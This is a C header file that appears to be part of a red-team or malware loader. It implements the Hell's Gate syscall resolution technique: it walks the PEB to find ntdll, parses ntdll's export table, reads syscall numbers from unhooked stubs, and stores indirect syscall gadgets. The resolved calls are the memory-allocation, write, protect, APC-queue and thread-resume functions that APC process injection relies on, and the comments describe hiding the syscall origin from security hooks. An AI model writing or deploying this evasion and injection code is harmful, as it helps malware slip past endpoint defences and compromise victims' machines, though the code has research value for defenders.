#pragma once
#include <windows.h>
#include <stdio.h>

#define SSN_NOT_FOUND 0xFFFFFFFF

// globals defined in syscalls.S
// SSNs: resolved at runtime by reading ntdll stub bytes
// addrs: ntdll syscall gadget address (func + 0x12) for indirect jump
extern DWORD     g_NtAllocSsn;
extern DWORD     g_NtWriteSsn;
extern DWORD     g_NtProtectSsn;
extern DWORD     g_NtQueueApcSsn;
extern DWORD     g_NtResumeSsn;

extern ULONG_PTR g_NtAllocAddr;
extern ULONG_PTR g_NtWriteAddr;
extern ULONG_PTR g_NtProtectAddr;
extern ULONG_PTR g_NtQueueApcAddr;
extern ULONG_PTR g_NtResumeAddr;

// Walk PEB->Ldr->InMemoryOrderModuleList to get ntdll base.
// No API calls used. ntdll is always the second entry in the list (after the exe).
// Offsets (x64):
//   PEB+0x18 = Ldr pointer
//   Ldr+0x20 = InMemoryOrderModuleList.Flink  (exe entry)
//   entry->Flink                               (ntdll entry's InMemoryOrderLinks)
//   InMemoryOrderLinks+0x20                    (DllBase, since InMemoryOrderLinks
//                                               sits at +0x10 inside the struct
//                                               and DllBase sits at +0x30)
static PVOID get_ntdll_base(void) {
    ULONG_PTR peb, ldr, flink;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    ldr   = *(ULONG_PTR*)(peb  + 0x18);
    flink = *(ULONG_PTR*)(ldr  + 0x20); // InMemoryOrderModuleList.Flink -> exe
    flink = *(ULONG_PTR*)(flink);        // exe->Flink -> ntdll InMemoryOrderLinks
    return (PVOID)*(ULONG_PTR*)(flink + 0x20); // +0x20 from InMemoryOrderLinks = DllBase
}

// Walk a module's Export Address Table by name.
// Returns the function's VA, or NULL if not found.
static PVOID get_func_addr(PVOID base, const char *name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((ULONG_PTR)base + dos->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        (ULONG_PTR)base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    PDWORD names = (PDWORD)((ULONG_PTR)base + exp->AddressOfNames);
    PWORD  ords  = (PWORD) ((ULONG_PTR)base + exp->AddressOfNameOrdinals);
    PDWORD funcs = (PDWORD)((ULONG_PTR)base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *n = (char *)((ULONG_PTR)base + names[i]);
        if (strcmp(n, name) == 0)
            return (PVOID)((ULONG_PTR)base + funcs[ords[i]]);
    }
    return NULL;
}

// Read the SSN from an unhooked ntdll stub.
// Clean stub layout:
//   +0x00  4C 8B D1        mov r10, rcx
//   +0x03  B8 XX XX XX XX  mov eax, <SSN>   <- read 4 bytes at +0x04
//   +0x08  ...
//   +0x12  0F 05           syscall
//
// If +0x00 is E9 (jmp) the stub is hooked; we return SSN_NOT_FOUND.
static DWORD get_ssn(PVOID func) {
    ULONG_PTR p = (ULONG_PTR)func;
    if (*(BYTE*)(p+0) == 0x4C &&
        *(BYTE*)(p+1) == 0x8B &&
        *(BYTE*)(p+2) == 0xD1 &&
        *(BYTE*)(p+3) == 0xB8)
        return *(DWORD*)(p + 0x04);
    return SSN_NOT_FOUND;
}

// Resolve SSNs and indirect syscall gadgets for all five Nt* functions.
//
// Hell's Gate part: read SSN from ntdll stub bytes at runtime instead of
// hardcoding. Works on any Windows version with no lookup table.
//
// Indirect syscall part: store func+0x12 as the jump target so the
// kernel sees ntdll as the syscall origin rather than our binary.
//
// Returns 0 on success, -1 if any stub appears hooked.
static int resolve_hells_gate(void) {
    PVOID ntdll = get_ntdll_base();
    printf("[*] ntdll base: %p\n", ntdll);

    PVOID  p;
    DWORD  ssn;

    #define RESOLVE(fn, ssn_g, addr_g) \
        p = get_func_addr(ntdll, fn); \
        if (!p) { printf("[-] %s not found in EAT\n", fn); return -1; } \
        ssn = get_ssn(p); \
        if (ssn == SSN_NOT_FOUND) { printf("[-] %s is hooked\n", fn); return -1; } \
        ssn_g  = ssn; \
        addr_g = (ULONG_PTR)p + 0x12; \
        printf("[*] %-32s SSN=0x%02X  gadget=%p\n", fn, ssn, (void*)addr_g)

    RESOLVE("NtAllocateVirtualMemory", g_NtAllocSsn,    g_NtAllocAddr);
    RESOLVE("NtWriteVirtualMemory",    g_NtWriteSsn,     g_NtWriteAddr);
    RESOLVE("NtProtectVirtualMemory",  g_NtProtectSsn,   g_NtProtectAddr);
    RESOLVE("NtQueueApcThread",        g_NtQueueApcSsn,  g_NtQueueApcAddr);
    RESOLVE("NtResumeThread",          g_NtResumeSsn,    g_NtResumeAddr);

    #undef RESOLVE
    return 0;
}
